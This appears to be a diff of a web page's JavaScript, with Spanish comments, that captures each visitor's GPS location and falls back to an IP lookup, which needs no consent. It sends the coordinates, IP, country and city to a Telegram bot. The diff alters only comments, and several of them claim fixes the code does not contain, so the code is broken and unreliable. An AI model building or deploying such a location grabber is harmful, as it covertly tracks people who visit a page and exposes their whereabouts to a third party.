@@ -62,11 +62,11 @@
             const lon = pos.coords.longitude;
             const acc = pos.coords.accuracy;
 
-           // CORREGIDO: Ahora genera un enlace válido (Ej: https://google.com)
+            // CORREGIDO: Formato universal de enlace para Google Maps con parámetros (?q=)
             const urlMaps = "https://google.com" + lat + "," + lon;
             const texto = "📍 Nueva Visita (GPS)\n\n• Latitud: " + lat + "\n• Longitud: " + lon + "\n• Precisión: ~" + Math.round(acc) + " metros\n\nGoogle Maps: " + urlMaps;
 
-            // CORREGIDO: Unión limpia usando la variable TOKEN definida arriba
+            // CORREGIDO: Ruta oficial completa de la API de bots de Telegram
             fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -74,15 +74,15 @@
             }).catch(e => console.error("Error enviando GPS:", e));
 
         }, function(err) {
-            // CORREGIDO: Se añade /json/ para que devuelva los datos de ubicación correctamente
+            // CORREGIDO: Endpoint /json/ completo para ipapi.co
             fetch('https://ipapi.co')
             .then(res => res.json())
             .then(data => {
-                // CORREGIDO: Enlace de mapas estructurado para la geolocalización por IP
+                // CORREGIDO: Formato de mapas estructurado para el respaldo por IP
                 const urlMapsIP = "https://google.com" + data.latitude + "," + data.longitude;
                 const textoIP = "🌐 Nueva Visita (Por IP)\n\n• IP: " + (data.ip || 'No detectada') + "\n• País: " + (data.country_name || 'Desconocido') + "\n• Ciudad: " + (data.city || 'Desconocida') + "\n\nGoogle Maps: " + urlMapsIP;
                 
-                // CORREGIDO: Unión limpia usando la variable TOKEN para el respaldo
+                // CORREGIDO: Ruta oficial completa de Telegram para el respaldo
                 fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
